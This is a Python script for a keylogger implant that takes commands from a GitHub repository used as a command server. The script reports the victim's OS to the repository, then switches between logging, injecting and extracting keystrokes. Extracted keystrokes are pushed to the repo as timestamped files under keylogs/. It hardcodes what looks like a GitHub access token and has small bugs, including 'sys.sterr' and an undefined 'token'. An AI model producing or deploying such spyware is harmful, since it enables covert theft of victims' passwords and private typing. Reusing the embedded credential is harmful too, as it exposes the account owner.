from github_git import GitHubRepo, GitLike
from keyboard_handler import KeyboardHandler

import platform
import sys
import time 
import os

def detect_os( ) -> str:
    """
    Detect OS this script is being run on, 
    return either W for Windows, M for MacOS, L for Linux
    """
    system = platform.system()
    if system == "Windows": # Windows
        return "W"
    elif system == "Darwin": # MacOS
        return "M"
    elif system == "Linux": # Linux
        return "L"
    # Ideally should never reach here and should be able to detect OS
    return "COULD_NOT_FIND_OS"

def setup_communication_with_github_repo() -> GitHubRepo:
    # https://github.com/Alishah634/HID_Command_Control_Server
    repo = GitHubRepo(
        owner = "Alishah634",
        repo = "HID_Command_Control_Server",
        # Use a classic token not a fine grained one!
        token = "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", # Hardcode belongs to Ali (BAD PRACTICE!!!)
    )

    # Read commits:
    commits = repo.get_recent_commits()
    for c in commits:
        print(c["sha"], c["commit"]["message"])

    # Update a file
    result = repo.update_file(
        path="README.md",
        new_content="Updated from Python without git (development test 1)!",
        message="Automated commit"
    )

    print("Committed:", result["commit"]["sha"])

    return repo

# def recieve_mode_from_git_repo()
#     pass


if __name__ == "__main__":
    # What is this supposed to do? 
    # It needs to start the program ? Figure out which mode to be in?
    # the mode needs to be figured out by the listener so key.py (logging/reading) keystrokes
    # figures out the mode
    #
    # Something to control these:
    #
    # Attack mode: OS Dependent?
    #  Extract mode:
    # Logging mode: Key.py (log keystrokes) [need to add OS Specific commands]

    # Detect the OS we are running on:
    # print("OS Name:", os.name)
    # print("Sys Platform:", sys.platform)
    # print("Platform System:", platform.system())

    operating_system_detected = detect_os()
    if operating_system_detected == "COULD_NOT_FIND_OS":
        print("FAILED to detect operating system detected", file=sys.sterr)

    # Set up connection with GitHub repo to recieve and extract commands:
    repo = setup_communication_with_github_repo()
    git = GitLike(repo, branch= "main")
    if repo.can_reach_github():
        # Add the detect_os:
        git.add("os.txt",f"{operating_system_detected}\n")
        git.add("mode.txt",f"0\nL") # Set default mode as Logging\n
        git.add("ack.txt",f"0\n")
        git.commit_and_push(f"Commiting operating_system_detected, Set ack to 0, indiating default mode settings")

    # Set up instance of the keyhandler which handles logging, injection and extraction:
    handler = KeyboardHandler(mode="L", log_file="log.txt")

    # What mode are we in ? Log -> L, Inject -> I , Extract -> E (Default mode is Log):
    # Explicitly set default mode to Log -> "L" just in case the if fails!:
    mode = "L"

    # Can we communicate with Github?
    can_communicate_to_github = False
    can_extract = False
    # Set the check for connection to GitHub:
    while True:
        print("=======================",end=" ",file=sys.stderr)

        # So we dont hammer Github and get yelled at!!!
        time.sleep(5)

        # Might need this later... I think?
        # can_communicate_to_github = True if repo.can_reach_github() else False
        if repo.can_reach_github():
            print("AM I COMMUNICATING WITH THE COMMAND SERVER ?", file=sys.stderr)

            # If we can can_communicate_to_github then we can ask it for the mode!
            mode, error_message = repo.get_mode_from_repo()
            if mode == "E" and not can_extract:
                mode = "L"

            print(f"{error_message}",file=sys.stderr)

            if error_message is not None: # Relay there was an issue in setting the mode!
                git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
                git.commit_and_push(f"Error Detected when setting mode from command server!!!")
        else:
            print("There is no connection with Command server....",file=sys.stderr)

        print(f"Prev ack: {repo.prev_ack_number}, Curr ack: {repo.ack_number:}",file=sys.stderr)
        if repo.prev_ack_number != repo.ack_number:
            git.add("ack.txt", f"{repo.ack_number}")
            git.commit_and_push(f"Sending updated ack_number {repo.ack_number}")

        print(f"Last Sent ACK: {repo.ack_number}" , file=sys.stderr)

        if mode == "L":
            # Call key logging function:
            print(f"Starting Key Logging...")
            handler.mode = mode
            handler.start_in_background()

        elif mode == "I":
            # Call key Injection function:
            handler.mode = mode

        elif mode == "E":
            can_extract = True
            # Call key Extraction function:
            handler.mode = mode
            keystrokes_to_extract = handler.extract_logged_keys(source = "memory", limit = None)

            # If no keystorkes to default to Logging, just set that we cant extract:
            # TODO:: Ideally we should inform the command server of this decision by::q
            #
            # updating mode.txt and increment the ack.txt:
            if not keystrokes_to_extract: 
                can_extract = False
                print("There were no keys to extract...", file=sys.stderr)
                git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
                git.commit_and_push(f"Error when reading keys to extract from Victim/Control to Command server!!!")
                continue

            if can_extract:
                """
                Take a list of keystrokes (strings) and push them as a single file
                under keylogs/ on the GitHub repo using the GitLike API.
                """
                print("There ARE keys to extract...", file=sys.stderr)
                error_message = None
                try:
                    # Writing IO Bad Idea:
                    keystrokes_file_content= "".join( keystrokes_to_extract)

                    # 1. Build file content (one keystroke per line)
                    file_content = "\n".join(keystrokes_to_extract) + "\n"

                    # 2. Choose a remote path like: keylogs/keys_2025-12-10_01-23-45.txt
                    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                    remote_path = f"keylogs/keys_{timestamp}.txt"

                    if not token:
                        print("GITHUB_TOKEN not set; cannot push to GitHub",file=sys.stderr)

                    # 3. Stage the file and commit+push
                    git.add(remote_path, file_content)
                    commit_sha = git.commit_and_push(f"Upload keystroke log {timestamp}")

                    print(f"[GitHub] Uploaded {remote_path} in commit {commit_sha}")
                except Exception as e:
                    error_message = f"{e}"
                    if error_message is not None: # Relay there was an issue in setting the mode!
                        git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
                        git.commit_and_push(f"Error Detected when extracting keys from Victim/Control to Command server!!!")

        else:
            # Call key loggin function:
            handler.mode = "L"
            handler.start_in_background()

